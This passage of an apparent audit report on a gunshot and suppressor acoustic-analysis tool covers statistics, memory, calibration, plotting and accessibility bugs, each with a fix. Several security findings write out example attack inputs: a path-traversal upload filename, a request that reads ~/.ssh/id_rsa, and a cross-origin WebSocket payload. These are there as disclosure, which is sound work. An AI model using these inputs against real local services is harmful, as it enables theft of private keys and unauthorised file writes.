**Failure:** main.py:841 prints `LAE mean: {aggregate.LAE_mean:.1f} ± {aggregate.LAE_std:.1f} dB` — a mean computed in the energy domain paired with a standard deviation computed in the dB domain. For a 5-shot string with LAE = [100, 100, 100, 100, 110] dB the tool reports '104.5 ± 4.0 dB'. The arithmetic centre of those numbers is 102.0 dB, so the quoted interval 100.5-108.5 dB contains only one of the five observations and excludes the four identical ones. Separately np.std defaults to ddof=0 (population), which for a sample of N shots understates σ by 1-sqrt((n-1)/n): 18.4% at n=3, 10.6% at n=5, 5.1% at n=10 — so a 5-shot suppressor qualification reports 4.00 dB where the sample standard deviation is 4.47 dB. Finally, Lpeak — the single number the suppressor industry actually quotes — gets only `max()`. A one-shot outlier (a squib, a case-head separation, a wind gust, a neighbouring lane) sets the entire reported Lpeak with no median, no mean, no spread, and no way to see it in the aggregate.

**Fix:** Split the two quantities: keep the energy average but rename the field to LAE_energy_mean (it is the correct dose-type aggregate) and never pair it with an arithmetic ±. Add arithmetic mean, sample std (ddof=1), median, min, max and a t-based 95% CI for every reported metric including Lpeak_Z, Lpeak_C, LAImax and b_duration; fix main.py:841 to print 'LAE energy-avg X dB; arithmetic mean Y ± Z dB (s, n=N)'. Add median ± 3·MAD outlier flagging that reports both with- and without-outlier statistics rather than dropping shots. Note these aggregates are computed from per-shot values that are themselves wrong until the sosfiltfilt weighting bug is fixed — sequence that fix first.


### Extracted audio is cached by filename stem and reused without validation — including truncated files from a timed-out ffmpeg

`app.py:221` · Pipeline & I/O

```python
# Skip extraction if we already have this file
    if wav_path.is_file():
        return wav_path
```

**Failure:** (a) The ffmpeg call at app.py:229 has `timeout=120`; a 30-minute 4K video exceeds it, `subprocess.TimeoutExpired` is raised and caught by the generic handler at app.py:849 — but the partially written .wav is left on disk. The operator retries, `wav_path.is_file()` is true, and SASA analyses the truncated recording as if complete, silently reporting fewer shots. (b) Two different videos both named GunTest.mov (morning and afternoon strings, entered via the "or enter file path" box) map to the same uploads/GunTest.wav; the second analysis silently re-reports the first video's audio. main.py:1121 has the identical bug (`if not audio_path.exists(): extract_audio(...)`).

**Fix:** Extract to `wav_path.with_suffix('.wav.part')` and os.replace() onto the final name only after returncode==0 and a non-zero size check; key the cache name on a short hash of (resolved source path, st_size, st_mtime_ns) so same-named or edited sources do not collide; and either remove the 120 s timeout or scale it from the probed source duration.


### Uploaded filename is used unsanitised as a filesystem path, allowing writes outside the upload directory

`app.py:533` · Pipeline & I/O · CWE-22

```python
dest = UPLOAD_DIR / filename
        if dest.exists():
```

**Failure:** `filename` comes straight from the multipart Content-Disposition header (app.py:438). A POST to http://localhost:3847/api/upload with `filename="../../../Library/LaunchAgents/x.plist"` yields `~/.sasa/Audio/uploads/../../../Library/LaunchAgents/x.plist`, and `dest.write_bytes(file_data)` follows it, writing outside the sandbox. multipart/form-data is a CORS-simple request type, so any web page the operator visits while SASA is running can issue this POST cross-origin with no preflight; the server performs no Origin or Host check.

**Fix:** Replace app.py:533 with `safe = Path(filename).name` plus rejection of empty/'.'/'..'/names containing NUL, then `dest = UPLOAD_DIR / safe` and verify `dest.resolve().is_relative_to(UPLOAD_DIR.resolve())`. Whitelist the suffix against AUDIO_EXTS | VIDEO_EXTS. Add a Host-header allowlist (localhost/127.0.0.1 with the bound port) applied in do_GET/do_POST for every request, and reject POSTs carrying an Origin header that is not the server's own origin.


### /api/image and /api/results accept an arbitrary absolute `dir`, turning the local server into a file-read oracle

`app.py:619` · Pipeline & I/O · CWE-22, CWE-350 (DNS rebinding)

```python
if safe_sub:
            file_path = Path(dir_path) / safe_sub / safe_name
        else:
            file_path = Path(dir_path) / safe_name
```

**Failure:** `GET http://localhost:3847/api/image?dir=/Users/graham/.ssh&file=id_rsa` returns the private key as application/octet-stream. Only the basename is sanitised; the directory is unrestricted. With no Host-header validation, a DNS-rebinding page can bind an attacker-controlled hostname to 127.0.0.1 and read arbitrary files as same-origin. `_serve_static` (app.py:494-499) additionally strips only literal '..'/'.' parts, so on Windows a request for `/C:/Users/x/secret.txt` makes pathlib's join discard RENDERER_DIR entirely (`Path('a') / 'C:/'` -> `C:/`) and serves the file — and SASA.exe is a shipped Windows target.

**Fix:** In _api_results and _api_image, resolve the requested path and require `resolved.is_relative_to(ANALYSIS_DIR.resolve())` before any read; return 403 otherwise. In _serve_static, build the path then require `resolved.is_relative_to(RENDERER_DIR.resolve())` rather than filtering parts — that single check covers '..', drive letters and UNC. Add the Host allowlist from the upload finding to every request.


### CSV and JSON are written last, so any plotting failure discards all computed metrics

`main.py:969` · Pipeline & I/O

```python
# Save data files
    print("\n[6/6] Saving data files...")

    # CSV summary
    csv_path = output_dir / "metrics_summary.csv"
    save_csv_summary(csv_path, shot_metrics)
```

**Failure:** A 5-minute 192 kHz recording: detection and per-shot metrics complete at step [4/6], then `analyze_stft(pressure_Pa, ...)` at main.py:891 raises MemoryError (see stft-full-file-memory-blowup). The exception propagates to main.py:1145, prints a traceback and returns 1. The output directory contains only a waveform plot; metrics_summary.csv, analysis_metadata.json and config.json were never written, and the minutes of metric computation are lost. The same happens for `--formats "png, pdf"` (matplotlib rejects the format), for a matplotlib backend failure, or for a full disk.

**Fix:** Move the three save calls (save_csv_summary, save_json_metadata, config.to_json) to immediately after compute_aggregate_metrics() in both analyze_file() and _analyze_file_chunked(), then wrap each plot block in its own try/except that appends to a warnings list, and rewrite analysis_metadata.json at the end to include those warnings. Downgraded from critical: no reported number is wrong, the failure mode is loss of a completed run's output.


### Non-chunked path materialises the entire framed signal and full complex STFT — a 5-minute 192 kHz file needs >5 GB

`main.py:891` · Pipeline & I/O

```python
stft_z_full = analyze_stft(pressure_Pa, sr, nperseg=config.nperseg,
                               noverlap=config.noverlap, weighting='Z')
```

**Failure:** MAX_DURATION_FULL_LOAD_S is 600 s and is compared against duration only, ignoring sample rate and channel count. A 300 s 192 kHz recording = 57.6e6 samples; with nperseg=2048/noverlap=1536 (hop 512) that is 112,500 frames. STFT.py:141 does `frames_windowed = frames * win_amplitude[None, :]` -> 112500x2048 float64 = 1.84 GB, `rfft` output complex128 = 1.84 GB, magnitude float64 = 0.92 GB, on top of the 0.92 GB float64 pressure array and the 0.46 GB float32 samples still referenced by `wav_data`. Peak >5 GB for the Z spectrogram, repeated again for C at main.py:909. On a 16 GB laptop the run dies with MemoryError and (per data-files-written-after-all-plots) loses all metrics. A 9-minute 192 kHz file — still under the 600 s threshold — is roughly double that.

**Fix:** Gate the chunked path on total workload rather than duration: in main.py:767-773 use `frames * channels > ~50e6` (from get_wav_info, which already returns frames and channels) OR duration > 600 s. Separately, make compute_stft in STFT.py block over frames (e.g. 4096 frames per iteration) writing into a preallocated float32 output, so the framed and complex intermediates never exceed a bounded size. Downgraded from critical: it is an availability/robustness failure, not a wrong measurement — but it becomes total data loss because of data-files-written-after-all-plots.


### Chunked path skips spectrogram frame decimation whenever Plotly is installed, producing a multi-GB array/HTML

`main.py:555` · Pipeline & I/O

```python
if _PLOTLY_AVAILABLE:
            time_z_list.append(stft_z.time_s + chunk_start_s)
            mag_z_list.append(stft_z.magnitude_dB)
        else:
            take = slice(None, None, SPECTROGRAM_DOWNSAMPLE)
```

**Failure:** The stated target case of a 30-minute 192 kHz recording. 1800 s / 120 s = 15 chunks, each producing ~45,000 STFT frames; `mag_z = np.concatenate(mag_z_list, axis=1)` at main.py:567 builds a 1025 x 675,000 float64 array = 5.5 GB -> MemoryError. If it survives, `save_interactive_spectrogram_html` serialises that array into one self-contained HTML file that no browser can open. The PNG branch decimates by SPECTROGRAM_DOWNSAMPLE=40; the Plotly branch does not, so installing Plotly turns a working run into a failing one.

**Fix:** Apply decimation in the Plotly branch too, but compute the stride from the total expected frame count rather than reusing the fixed 40 (target ~4000 columns across the whole file), and mirror the existing _waveform_chunked_full_res_around_shots approach by emitting separate full-resolution per-shot spectrograms. Note this only triggers on files over 600 s (the chunked path), so it is high rather than critical.


### `noverlap` is fixed at 1536 and never derived from `nperseg`; the UI's 512 and 1024 options crash the run

`main.py:94` · Pipeline & I/O

```python
# STFT parameters
    nperseg: int = 2048
    noverlap: int = 1536
```

**Failure:** index.html:184-188 offers FFT Window Size 512/1024/2048/4096/8192, and app.py:801 sets only `nperseg`. Selecting 512 leaves noverlap=1536, so STFT.py:109 raises `ValueError: noverlap must satisfy 0 <= noverlap < nperseg` at step [5/6]; the run aborts with no CSV/JSON. Selecting 8192 does not crash but silently drops overlap from 75% to 18.75% (hop 6656 = 34.7 ms at 192 kHz), so a 1 ms muzzle-blast transient can fall entirely between analysis frames and disappear from the spectrogram. `--nperseg 512` on the CLI fails identically.

**Fix:** Make noverlap derived: add `noverlap: Optional[int] = None` and in AnalysisConfig.__post_init__ set `self.noverlap = int(self.nperseg * 0.75)` when None, then assert `0 <= self.noverlap < self.nperseg` and `self.nperseg > 0` so the run fails before audio is loaded. This also fixes the silent overlap collapse at 4096/8192.


### In chunked mode a shot near a chunk boundary gets a truncated analysis window, under-reporting SEL

`main.py:413` · Pipeline & I/O · ISO 17201-1 (impulse energy integration window)

```python
chunk_shots = detect_shots(
            pressure_chunk,
            sr,
            threshold_dB=config.detection_threshold_dB,
```

**Failure:** `detect_shots` clamps windows to the array it was given (shot_detect.py:285-286: `window_end = min(n, refined_idx + post_samples)` where n is the 120 s chunk length). A shot whose peak lands 20 ms before a chunk boundary gets window_end = chunk end, i.e. a 20 ms post-window instead of the configured 200 ms. main.py:459-460 then loads exactly `window_end - window_start` frames for metrics, so LAE/LZE/LCE integrate only the first 20 ms of the decay (typically 1-3 dB low for a suppressed shot), b_duration_ms is truncated and LASmax is meaningless. Nothing warns, and the same file analysed under 600 s (non-chunked) would give different numbers.

**Fix:** Simplest correct fix given that per-shot metrics already re-read from disk: after the merge loop at main.py:450, recompute each shot's window in absolute file coordinates — `window_start = max(0, shot.index - pre_samples)`, `window_end = min(total_frames, shot.index + post_samples)` — before the metrics loop. (The proposed overlapped-chunk read also works but is more invasive and still needs dedup logic.)


### All channels are averaged to mono with no channel-selection parameter anywhere in CLI, config or UI

`main.py:778` · Pipeline & I/O · MIL-STD-1474E §5.2.2 (each measurement position reported separately)

```python
# Note: ST2012 is stereo pair, but we average to mono for analysis
    print("\n[1/6] Loading audio...")
    wav_data = load_wav(wav_path, dtype=config.load_dtype, mono=True)
```

**Failure:** A two-mic test — one mic 1 m left of the muzzle, one at the shooter's ear — recorded to a stereo file. WavLoader.py:117 does `data.mean(axis=1)`, arithmetically averaging two independent acoustic measurements. If the muzzle mic peaks at 160 dB (200 Pa) and the ear mic at 140 dB (20 Pa), the averaged peak is 110 Pa -> 134.8 dB, and SASA reports 134.8 dB as "the" measurement — 25 dB below the muzzle level. There is no `--channel` flag in argparse, no `channel` key in AnalysisConfig, and no field in the UI.

**Fix:** Add a `channel: Optional[int] = None` config key plus `--channel N` and a UI selector; pass it through to load_wav/load_wav_chunk and select rather than average. When the file has >1 channel and no channel was specified, print a loud warning and default to channel 0 rather than averaging (averaging two acoustic measurement positions is never a valid operation). Record `channels` and the selected `channel` in analysis_metadata.json.


### Zero detections exits 0, writes no CSV while printing that it did, and publishes 0.0 dB as the aggregate result

`main.py:324` · Pipeline & I/O

```python
if not shot_metrics:
        return

    fieldnames = [
```

**Failure:** Threshold set too high (see detection-threshold-default-too-high). `save_csv_summary` returns before creating the file, yet main.py:975 unconditionally prints "  ✓ CSV: metrics_summary.csv". `compute_aggregate_metrics([])` (metrics.py:611) returns Lpeak_Z_max=0.0, LAE_mean=0.0, which `save_json_metadata` writes to analysis_metadata.json; the UI then renders "Peak SPL (Z) 0.0 dB" and "LAE (mean) 0.0 dB" cards, and History shows "0.0 Peak dB" — indistinguishable from a real measurement. main.py:1143 returns exit code 0, so a batch script sees success.

**Fix:** Write the CSV header even with zero rows (drop the early return, keep the DictWriter), and only print the ✓ line if csv_path.exists(). Change AggregateMetrics.to_dict to emit null for the level fields when n_shots == 0 and have app.js render null as '—'. Add `status: 'no_shots_detected'` to the JSON and return a distinct non-zero exit code from main() so batch callers can branch on it.


### Detection parameters accept negative, zero, NaN and infinite values, silently producing wrong shot counts or empty windows

`main.py:1043` · Pipeline & I/O

```python
det_group.add_argument("--threshold-dB", type=float, default=120.0,
                          help="Detection threshold in dB SPL (default: 120)")
```

**Failure:** (a) `--threshold-dB -20` (or any value below the noise floor; the UI number input has no `min`): threshold_Pa = 2e-6 Pa, so `above` is True everywhere and shot_detect.py:145-163 collapses the whole recording into one region, reporting exactly 1 shot for a 30-round string with no warning. (b) `--post-ms 0`: window_end == refined_idx, so `compute_shot_metrics` receives a zero-length array and duration_s ~ 0. (c) `--pre-ms -100`: window_start = idx + 100 ms > window_end, an empty slice, NaN metrics written to the CSV. (d) `--Pa-per-FS nan` passes `Pa_per_FS <= 0` at calibration.py:59 (NaN comparisons are False), so every reported level is `nan` in the CSV and no error is raised.

**Fix:** Validate in AnalysisConfig.__post_init__ (main.py:107): require math.isfinite() and > 0 for Pa_per_FS and nperseg; require finite and >= 0 for pre_shot_ms, post_shot_ms, refractory_ms; require pre_shot_ms + post_shot_ms > 0; bound detection_threshold_dB to a sane range (e.g. 40..200). Separately fix calibration.py:59 to `if not math.isfinite(self.Pa_per_FS) or self.Pa_per_FS <= 0`. Do not claim post-ms=0 or negative pre-ms produce empty windows — they produce mis-placed windows.


### plot_third_octave_heatmap mislabels every band row by half a band because the y coordinates are cell edges used as centres

`plots.py:391` · UI & Presentation · IEC 61260-1 (band centre frequencies), ISO 266

```python
n_bands = len(center_frequencies)
    band_indices = np.arange(n_bands + 1) - 0.5

    pcm = ax.pcolormesh(
        time_s,
        band_indices[:-1],
        band_levels_dB,
```

**Failure:** `band_indices[:-1]` has length n_bands with values -0.5, 0.5, 1.5, ..., n_bands-1.5. Since len(y) == band_levels_dB.shape[0], shading='auto' resolves to 'nearest' and treats those values as cell CENTRES. Row i is therefore drawn centred at y = i - 0.5. But the tick labels are then placed at integer indices (`ax.set_yticks(tick_indices)` with `center_frequencies[i]`, lines 414-417), so the tick reading "1000" sits half a band away from the row that actually holds the 1 kHz band. On a 1/3-octave heatmap a half-band offset is a 12% frequency error: an operator reading peak suppressed energy at the tick marked 1000 Hz is actually looking at the 800/1000 boundary. Every 1/3-octave heatmap in every report is shifted.

**Fix:** Pass `np.arange(n_bands)` as y (so the same integers used for the ticks are used as centres) and keep shading='auto', or pass the full n_bands+1 edge array with shading='flat' together with matching time edges. Add a regression test: synthesise a 1 kHz tone, run ThirdOctaveAnalyzer, and assert the argmax row of the returned band_levels_dB renders at the tick labelled 1000.


### Every spectrogram auto-scales its own colour range, so two recordings — or the two panels of one shot figure — cannot be compared

`plots.py:305` · UI & Presentation

```python
if db_range is None:
        vmax = result.get_max_level()
        vmin = max(0, vmax - 80)
    else:
        vmin, vmax = db_range
```

**Failure:** The whole point of the product is suppressed-vs-unsuppressed comparison. An unsuppressed shot peaking at 165 dB renders with a 85-165 dB colour map; the suppressed shot at 138 dB renders with a 58-138 dB map. Side by side in a customer report both look equally bright with identically-styled colorbars — the 27 dB reduction is entirely invisible, and a careless reader concludes the suppressor did nothing. The same defect appears WITHIN one figure: create_shot_summary_figure computes vmin_z/vmax_z from stft_z (line 598) and vmin_c/vmax_c from stft_c (line 613) independently, so the Z and C panels of a single shot are on different scales while being presented as a matched pair. DB_RANGE_DEFAULT = (20, 160) is defined at line 93 and never used.

**Fix:** Compute one (vmin, vmax) per analysis session across all shots and both weightings, record it in analysis_metadata.json, and pass it to every plot_spectrogram_dB / save_interactive_spectrogram_html / create_shot_summary_figure call. Print the range in the figure subtitle so a reader can tell two figures share a scale. Add a --db-range CLI flag and UI control. At minimum, make the Z and C panels of create_shot_summary_figure share one range and one colorbar — that is a two-line change and removes the worst case.


### loadResults swallows every failure to console and still navigates to a Results view showing stale or empty data

`ui/renderer/app.js:201` · UI & Presentation

```python
const resp = await fetch(`/api/results?dir=${encodeURIComponent(outputDir)}`);
      const data = await resp.json();
      if (!resp.ok) return console.error('Load failed:', data.error);
      ...
    } catch (err) {
      console.error('Load results error:', err);
    }
```

**Failure:** The server returns 404 'No analysis_metadata.json found' (server.js:99) because main.py crashed after plotting but before writing JSON. `loadResults` returns undefined, the caller's `.then(() => switchView('results'))` at app.js:136 still runs, and the user is dropped on the Results view. If a previous analysis was loaded, `#results-loaded` is still visible showing the PREVIOUS recording's Peak SPL, shot pills and metrics table — the operator reads last week's suppressor numbers believing they are today's. Nothing on screen contradicts this; the only evidence is in the DevTools console.

**Fix:** Make loadResults throw on !resp.ok and let the callers handle it. Before every load, clear state.metadata/state.shotImages, empty #metrics-row, #shot-selector, #shot-metrics-row, #metrics-table and #plot-* containers, and re-show #results-empty, so stale data can never be presented as current. Add a #results-error panel showing the directory, the server message and Retry. Only call switchView('results') from a resolved success.


### The per-shot panel omits every MIL-STD-1474E-relevant metric that the backend already computes

`ui/renderer/app.js:335` · UI & Presentation · MIL-STD-1474E Table (impulse noise: peak level and B-duration)

```python
const fields = [
      { label: 'Lpeak Z', value: shot.Lpeak_Z, unit: 'dB' },
      { label: 'Lpeak A', value: shot.Lpeak_A, unit: 'dB' },
      { label: 'Lpeak C', value: shot.Lpeak_C, unit: 'dB' },
      { label: 'LAE',     value: shot.LAE,     unit: 'dB' },
      { label: 'LAFmax',  value: shot.LAFmax,  unit: 'dB' },
      { label: 'LASmax',  value: shot.LASmax,  unit: 'dB' },
      { label: 'LZFmax',  value: shot.LZFmax,  unit: 'dB' },
      { label: 'Duration', value: shot.duration_s ? (shot.duration_s * 1000).toFixed(0) : null, unit: 'ms' },
    ];
```

**Failure:** metrics.py ShotMetrics.to_dict() emits b_duration_ms, rise_time_us, crest_factor_dB, spectral_centroid_Hz, kurtosis, LAImax, LZImax, LZSmax and LCE — all present in analysis_metadata.json and all absent from the UI. B-duration is the impulse-noise duration parameter MIL-STD-1474E hazard assessment turns on, and rise time is the primary indicator that the microphone/recorder bandwidth was adequate for a suppressed muzzle blast. A technician evaluating a suppressor in this UI literally cannot see them; they must open the raw JSON. `duration_s` is also mislabelled simply "Duration" with no indication that it is the analysis-window length, not B-duration — inviting it to be reported as B-duration.

**Fix:** Rename the existing card to 'Window length' (this is the urgent half — the current label invites a wrong transcription), and add a second row reading B-duration (ms), Rise time (us), Crest factor (dB), Spectral centroid (Hz), Kurtosis, LAImax, LZSmax and LCE straight from the shot object app.js:328 already holds. Group the cards under Peak / Exposure / Time-weighted / Impulse-character headings. No backend change is required — every value is already in the JSON.


### Nothing in the UI warns about clipped samples, zero shots detected, or an inadequate sample rate — invalid measurements are presented identically to valid ones

`ui/renderer/app.js:214` · UI & Presentation

```python
const inputFile = data.metadata.input_file || 'Unknown';
      const nShots = data.metadata.n_shots || 0;
      $('#results-subtitle').textContent = `${inputFile} — ${nShots} shots detected`;
```

**Failure:** A recording that clipped at 0 dBFS (extremely common with gunshots on a recorder set for speech) yields a truncated waveform whose Lpeak is a hard function of the recorder's ceiling, not the muzzle blast. The UI renders it as "PEAK SPL (Z) 171.2 dB" with the same styling as a clean measurement. Likewise a 44.1 kHz source (22 kHz Nyquist) cannot support a valid unweighted peak or rise time for a muzzle blast, and `n_shots = 0` renders as "— 0 shots detected" in 13px grey with the metric cards showing em-dashes and no explanation or remedy.

**Fix:** Compute the validity signals in the Python pipeline where the samples live (clipped-sample count/percentage per shot from the pre-calibration samples, sample rate vs required bandwidth, pre-shot noise floor vs peak, DC offset, calibration present/absent), write them into analysis_metadata.json, and render a pass/caution/fail panel above the metric cards in app.js. Do the clipping counter first — it is a few lines in main.py at the point samples are loaded (main.py:780) and it is the single most common way a gunshot measurement is silently invalid. For n_shots == 0, replace the em-dash cards with the detected max level vs the configured threshold plus a re-run action.


### Full-recording Plotly spectrograms embed the entire STFT matrix plus 3+ MB of plotly.js as inline JSON, and all three iframes load at once with no loading state

`ui/renderer/app.js:277` · UI & Presentation

```python
// Prefer interactive HTML (Plotly)
    if (imgData.html) {
      const src = `/api/image?dir=${encodeURIComponent(outputDir)}&file=${encodeURIComponent(imgData.html)}`;
      container.innerHTML = `<iframe src="${src}" title="${key}"></iframe>`;
      return;
    }
```

**Failure:** plots.py:813 calls `fig.write_html(...)` with the default include_plotlyjs=True, inlining ~3.5 MB of plotly.js per file, plus the heatmap z-matrix as JSON text. A 30 s, 96 kHz recording at nperseg=2048 yields roughly 2,800 frames x 1,025 bins ~ 2.9M floats, i.e. tens of megabytes of JSON per spectrogram. loadResults calls renderPlot four times back to back (app.js:221-233), inserting all iframes into the DOM simultaneously even though five of the six tabs are display:none — browsers still fetch and execute src for display:none iframes. The Results view therefore stalls for many seconds to minutes on a blank `.plot-viewer` with no spinner, no byte counter and no failure path if the tab runs out of memory.

**Fix:** Three changes: (1) pass `include_plotlyjs='directory'` in plots.py:738 and 813 and write plotly.min.js once into the output dir, so N files no longer carry N copies of the bundle; (2) decimate the heatmap in save_interactive_spectrogram_html to roughly 1500x600 cells before serialising, keeping full resolution only for per-shot windows; (3) in app.js:267-292, defer iframe creation until its tab is first activated (the tab handler at app.js:473-489 is the natural hook) and show a skeleton plus a 'Load interactive version' fallback to the PNG.


### index.html contains zero ARIA attributes and zero roles; live regions, tab semantics, icon-button names and status announcements are all absent

`ui/renderer/index.html:263` · UI & Presentation · WCAG 2.2 SC 4.1.2, SC 4.1.3 Status Messages, SC 1.1.1 Non-text Content

```python
<div class="results-tabs">
            <button class="tab-btn active" data-tab="overview">Overview</button>
```

**Failure:** `grep -c 'aria-\|role=' ui/renderer/index.html` = 0. Consequences: (1) the log pane and progress percentage are not live regions, so a screen-reader user gets no announcement that a 10-minute analysis finished; (2) `.btn-icon` buttons (#file-clear, #shot-prev, #shot-next, index.html:89/288/292) contain only an inline SVG with no `<title>` and no aria-label — they are announced as "button"; (3) toasts are appended to body with no role="status"/role="alert", so "Upload failed" is never announced; (4) the sidebar nav buttons have no aria-current, so the current view is unknowable; (5) `<canvas id="shot-band-canvas">` (index.html:300) has no fallback content or text alternative — the entire 1/3-octave band exposure chart is invisible to assistive tech even though the same numbers exist in shot.band_exposure_dB.

**Fix:** As proposed. Prioritise: (1) aria-label on the three icon buttons — a one-line fix that makes shot navigation usable; (2) role="status" / role="alert" on toasts in app.js:604 so upload and analysis errors are announced at all; (3) aria-live="polite" on #progress-pct; (4) the tablist semantics (shared with active-tab-indicator-invisible); (5) render the band data as an adjacent visually-hidden table built from the same shot.band_frequencies/band_exposure_dB arrays app.js:371-372 already reads.


### --text-muted #555568 is 2.56:1 on cards and is used for every unit, every metric label, every table header and every file path

`ui/renderer/styles.css:23` · UI & Presentation · WCAG 2.2 SC 1.4.3

```python
--text-muted: #555568;
```

**Failure:** #555568 (L=0.09430) on --bg-card #12121a (L=0.006362) = 2.56:1; on --bg-surface #0e0e14 = 2.64:1. Both fail the 4.5:1 body minimum and even the 3:1 large-text minimum. This token is applied to: `.metric-label` at 10px uppercase (styles.css:666-672 — the words "PEAK SPL (Z)" identifying the headline number), `.metric-unit` (styles.css:685-690 — the "dB" that makes the number meaningful), `.metrics-tbl th` (styles.css:856-869 — every column header of the metrics table), `.form-hint` ("Typical: 100-130"), `.file-path` at 11px mono (the actual path being analysed), `.history-detail`, `.shot-metric-label`, `.tab-btn` inactive, and `.no-image` empty states. Concretely: a technician reading the metrics table cannot tell LAFmax from LASmax because the header row is effectively invisible at arm's length under range lighting.

**Fix:** Raise --text-muted to about #7C8CA0 (~5.0:1 on #12121a) and introduce a separate genuinely-dim token used only for non-informational chrome (.version-tag, .footer-brand). Separately raise the 9-10px label sizes (.metric-label, .shot-metric-label, .metrics-tbl th, .form-hint) to 12px — the size, not just the colour, is what makes the metrics-table header row unreadable at arm's length.


### The selected results tab is distinguished by a background at 1.03:1 against the tab strip — the selection indicator is effectively invisible and has no ARIA equivalent

`ui/renderer/styles.css:718` · UI & Presentation · WCAG 2.2 SC 1.4.11 Non-text Contrast; SC 4.1.2 Name, Role, Value

```python
.tab-btn.active {
  background: var(--bg-card);
  color: var(--text-primary);
  box-shadow: 0 1px 3px rgba(0, 0, 0, 0.3);
}
```

**Failure:** --bg-card #12121a (L=0.006362) against the `.results-tabs` container --bg-surface #0e0e14 (L=0.004575) = 1.03:1. SC 1.4.11 requires 3:1 for a state indicator. The 0.3-alpha black box-shadow on an already-black background adds nothing. The only usable cue is text colour, and the inactive colour is the failing --text-muted (2.64:1), so a user glancing at the six-tab strip cannot tell which of Overview / Spectrogram (Z) / Spectrogram (C) / Bands / Per-Shot / Table they are looking at. index.html:263-270 has no role="tablist", no aria-selected and no aria-controls, so a screen-reader user gets six unlabelled buttons and no selection state at all.

**Fix:** Give .tab-btn.active a high-contrast marker — a 2px bottom rule in the accent plus a raised fill — rather than relying on a 1.03:1 background delta, and raise the inactive .tab-btn colour off --text-muted. Add role="tablist"/role="tab"/aria-selected/aria-controls in index.html:263-270, role="tabpanel"+aria-labelledby+tabindex="0" on 273-307, and roving-tabindex arrow-key handling in the app.js:473-489 tab handler.


### WebSocket accepts any connection with no Origin verification, and the run-analysis config is trusted verbatim including outputDir

`ui/server.js:163` · UI & Presentation

```python
wss.on('connection', (ws) => {
  ws.on('message', (raw) => {
    let msg;
    try { msg = JSON.parse(raw); } catch { return; }

    if (msg.type === 'run-analysis') {
      runAnalysis(ws, msg.config);
```

**Failure:** WebSockets are not subject to the same-origin policy. Any page the operator visits while SASA is running can `new WebSocket('ws://localhost:3847/ws')` and send `{type:'run-analysis',config:{filePath:'/any/file.wav',outputDir:'/Users/graham/Library/LaunchAgents'}}`. python-bridge.js:78-80 forwards `-o <outputDir>` unchecked, so the Python process creates directories and writes PNG/CSV/JSON anywhere the user can write. The attacker also receives the full stdout/stderr stream back over the socket (server.js:177-182), leaking absolute paths and file contents printed by main.py.

**Fix:** Check `req.headers.origin` in a `verifyClient`/`upgrade` handler and accept only `http://localhost:${PORT}` and `http://127.0.0.1:${PORT}`; drop everything else. Mint a per-process token into index.html at serve time and require it in the first WS frame. In runAnalysis, ignore any client-supplied outputDir entirely (or containment-check it under Audio/analysis) and reject filePath values that start with '-' (python-bridge.js:34 puts it in argv position 1, where argparse would parse it as an option).


### is_calibrated() keys off a substring of free text and is wrong in both directions

`calibration.py:160` · Weighting & Calibration

```python
def is_calibrated(self) -> bool:
        """Check if this is a real calibration (not the unit placeholder)."""
        return "UNCALIBRATED" not in self.description   # calibration.py:158-160
```

**Failure:** Verified by running the code. False positives (uncalibrated reported as calibrated): (a) Calibration(Pa_per_FS=1.0) with the default description='' returns is_calibrated()=True — the unit placeholder is indistinguishable from a real 1 Pa/FS calibration; (b) Calibration(1.0, 'uncalibrated') returns True — the check is case-sensitive; so do 'un-calibrated', 'not calibrated', 'NO CAL', 'TBD', any non-English note, and any auto-generated description from from_sensitivity() (calibration.py:100-101) or main.py:134 regardless of whether the numbers were guesses; (c) the whole 143.96 default path yields description='Direct: 143.96 Pa/FS' -> True. False negatives (real calibration reported as uncalibrated): Calibration(143.96, 'B&K 4189 + Zoom F6, ch2 UNCALIBRATED') returns False — a perfectly valid main-channel calibration is flagged bad because an unrelated note mentions the word; the UI's free-text 'Description (optional)' field (ui/renderer/index.html:139-140) is passed straight through as --cal-desc, so any operator note containing that word flips the flag. This boolean is written into every JSON report (main.py:161) and is the only machine-readable indicator that the numbers are absolute.

**Fix:** Add explicit fields to Calibration: `method: Literal['tone','sensitivity','direct','none']` and a stored `calibrated: bool` set at construction (uncalibrated() sets method='none', calibrated=False; from_sensitivity/from_dB_sensitivity set method='sensitivity'). Make is_calibrated() return the stored field, never parse description. Serialize method plus provenance (source file, timestamp, operator, calibrator model/serial) in main.py:157-162. Note this must be paired with the hardcoded-default fix: an explicit boolean alone still reports True for the unearned 143.96 default.


### Entering mic sensitivity without V-per-FS silently discards it and falls back to 143.96 Pa/FS with is_calibrated()=True

`main.py:126` · Weighting & Calibration

```python
if self.sensitivity_mV_per_Pa is not None and self.V_per_FS is not None:
            return Calibration.from_sensitivity(...)
        return Calibration(
            Pa_per_FS=self.Pa_per_FS,
            description=self.calibration_description or f"Direct: {self.Pa_per_FS} Pa/FS",
        )   # main.py:126-135
```

**Failure:** Executed against the repo code: AnalysisConfig(sensitivity_mV_per_Pa=50.0).get_calibration() returns Pa_per_FS=143.96, description='Direct: 143.96 Pa/FS', is_calibrated()=True. The user's 50 mV/Pa is thrown away with no message, and results are overstated by 17.1 dB. Two live paths reach this: (1) CLI `python main.py rec.wav --sensitivity-mV 50` — --V-per-FS has default=None (main.py:1036) so nothing forces the pair; (2) the desktop UI — ui/renderer/app.js:181-182 does `config.sensitivityMv = parseFloat($('#sensitivity-mv').value); config.vPerFS = parseFloat($('#v-per-fs').value);` and both fields are placeholder-only with no value and no `required` (ui/renderer/index.html:128,132). If the user fills sensitivity and leaves 'V per Full Scale' blank, parseFloat('') is NaN, JSON.stringify turns NaN into null, so app.py:785 `if config.get('vPerFS'):` is falsy, V_per_FS is never set, and the run proceeds on 143.96 Pa/FS while the UI shows the sensitivity the user typed.

**Fix:** Raise in AnalysisConfig.get_calibration() when exactly one of sensitivity_mV_per_Pa / V_per_FS is set. In argparse, validate the pair after parse_args and exit with a clear message. In app.py:781-786 use `is not None` plus math.isfinite instead of truthiness, and reject a sensitivity supplied without vPerFS rather than dropping it. In the UI, mark both fields required when cal-mode='sensitivity', block Run until both parse, and echo the derived Pa_per_FS (and the implied 0 dBFS level in dB SPL) back before the run.


### All analysis averages channels to mono — a mono mic in a 2-channel file reads exactly 6.02 dB low

`main.py:778` · Weighting & Calibration · MIL-STD-1474E (measurement-position definitions assume a single defined transducer per reported level)

```python
# Note: ST2012 is stereo pair, but we average to mono for analysis
    wav_data = load_wav(wav_path, dtype=config.load_dtype, mono=True)   # main.py:776-778

